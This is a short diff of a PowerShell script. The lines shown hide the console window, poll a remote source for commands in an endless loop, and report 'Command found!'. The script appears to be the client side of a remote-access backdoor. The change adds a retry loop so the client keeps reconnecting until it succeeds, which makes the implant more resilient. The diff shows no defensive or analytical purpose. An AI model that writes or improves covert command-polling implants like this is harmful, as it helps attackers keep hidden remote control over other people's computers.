@@ -1313,13 +1313,22 @@ Function Authenticate{
 # =============================================================== MAIN LOOP =========================================================================
 
 HideConsole
-PullMsg
-$previouscmd = $response
-VersionCheck
-WaitingMsg
+$connected = 0
+while($connected -eq 0){
+    try{
+	PullMsg
+        $previouscmd = $response
+        VersionCheck
+        WaitingMsg
+ 	sleep 1
+        $connected = 1
+    }
+    catch{
+    	sleep 5
+    }
+}
 
 while($true){
-
     PullMsg
     if (!($response -like "$previouscmd")) {
         Write-Output "Command found!"
